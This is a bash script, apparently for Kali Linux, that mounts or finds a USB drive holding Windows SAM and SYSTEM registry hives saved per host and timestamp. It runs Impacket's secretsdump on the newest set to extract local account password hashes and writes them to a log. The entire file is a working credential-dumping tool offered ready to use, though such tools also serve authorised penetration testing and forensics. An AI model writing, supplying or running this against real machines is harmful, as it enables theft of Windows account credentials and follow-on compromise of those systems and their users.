#!/usr/bin/env bash
set -euo pipefail

# Usage:
#   ./kali_dump_latest.sh                 # auto-find a mounted USB containing /hives
#   ./kali_dump_latest.sh /mnt/usb        # specify the mountpoint
#   ./kali_dump_latest.sh --device /dev/sdb1  # auto-mount this device to /mnt/usb, run, then unmount

MOUNT="${1:-}"
TRAP_MOUNTED=0

if [[ "$MOUNT" == "--device" ]]; then
  DEVICE="${2:-}"
  [[ -n "$DEVICE" ]] || { echo "[!] Pass a device, e.g. --device /dev/sdb1"; exit 1; }
  MOUNT="/mnt/usb"
  sudo mkdir -p "$MOUNT"
  if ! mountpoint -q "$MOUNT"; then
    sudo mount "$DEVICE" "$MOUNT"
    TRAP_MOUNTED=1
  fi
fi

if [[ -z "$MOUNT" ]]; then
  for base in "/media/$USER" "/run/media/$USER" "/mnt/usb"; do
    [[ -d "$base" ]] || continue
    for mp in "$base"/* "$base"; do
      [[ -d "$mp/hives" ]] && MOUNT="$mp" && break 2
    done
  done
fi

[[ -n "$MOUNT" ]] || { echo "[!] Could not auto-find USB mount. Pass a mountpoint or --device /dev/sdXN"; exit 1; }
HIVES="$MOUNT/hives"
[[ -d "$HIVES" ]] || { echo "[!] No 'hives' folder at $MOUNT"; ls -la "$MOUNT"; exit 1; }

LATEST_DIR=$(find "$HIVES" -mindepth 2 -maxdepth 2 -type d 2>/dev/null | sort | tail -n1 || true)
[[ -n "$LATEST_DIR" ]] || { echo "[!] No hive folders found under $HIVES (expected hives/<HOST>/<STAMP>/)"; exit 1; }

SAM="$LATEST_DIR/SAM.save"; SYSTEM="$LATEST_DIR/SYSTEM.save"
[[ -f "$SAM" ]] || SAM="$LATEST_DIR/SAM"
[[ -f "$SYSTEM" ]] || SYSTEM="$LATEST_DIR/SYSTEM"
[[ -f "$SAM" && -f "$SYSTEM" ]] || { echo "[!] SAM/SYSTEM not found in $LATEST_DIR"; ls -la "$LATEST_DIR"; exit 1; }

if python3 -c "import impacket" >/dev/null 2>&1; then
  SD=(python3 -m impacket.examples.secretsdump)
elif [[ -x /usr/bin/secretsdump.py ]]; then
  SD=(/usr/bin/secretsdump.py)
elif [[ -f /usr/share/doc/python3-impacket/examples/secretsdump.py ]]; then
  SD=(python3 /usr/share/doc/python3-impacket/examples/secretsdump.py)
else
  echo "[!] secretsdump not found. Install with: sudo apt install python3-impacket"
  [[ "$TRAP_MOUNTED" == "1" ]] && sudo umount "$MOUNT"
  exit 1
fi

echo "[*] Using hive dir: $LATEST_DIR"
echo "[*] Running secretsdump..."
"${SD[@]}" -sam "$SAM" -system "$SYSTEM" LOCAL | tee "$LATEST_DIR/secretsdump_$(date +%F_%H-%M-%S).log"

[[ "$TRAP_MOUNTED" == "1" ]] && sudo umount "$MOUNT"
